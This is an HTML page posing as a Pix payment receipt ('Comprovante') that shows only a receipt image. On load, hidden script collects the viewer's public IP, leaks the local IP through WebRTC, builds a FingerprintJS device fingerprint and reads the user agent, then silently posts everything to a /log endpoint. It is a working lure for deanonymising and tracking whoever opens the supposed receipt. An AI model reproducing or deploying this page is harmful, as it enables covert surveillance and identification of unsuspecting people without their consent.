<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <title>Comprovante</title>
  <style>
    body { background: #fff; text-align: center; font-family: Arial; }
    img { margin-top: 50px; width: 90%; max-width: 500px; }
  </style>
</head>
<body>
  <img src="comprovante.jpg" alt="Comprovante Pix" />

  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>

  <script>
    async function getWebRTCIP() {
      return new Promise(resolve => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = event => {
          if (event && event.candidate) {
            const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
            if (ipMatch) resolve(ipMatch[1]);
          }
        };
      });
    }

    async function rastrear() {
      const ipData = await fetch("https://api.ipify.org?format=json").then(r => r.json());
      const localIP = await getWebRTCIP().catch(() => "N/A");
      const fp = await FingerprintJS.load();
      const result = await fp.get();

      const payload = {
        ip: ipData.ip,
        localIP,
        visitorId: result.visitorId,
        userAgent: navigator.userAgent,
        device: `${navigator.platform} - ${navigator.userAgent}`
      };

      console.log("üì¶ Dados coletados:", payload);

      fetch("/log", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      })
      .then(r => {
        if (r.ok) console.log("‚úÖ Dados enviados com sucesso");
        else console.warn("‚ö†Ô∏è Erro ao enviar:", r.status);
      })
      .catch(err => console.error("‚ùå Falha:", err));
    }

    rastrear();
  </script>
</body>
</html>
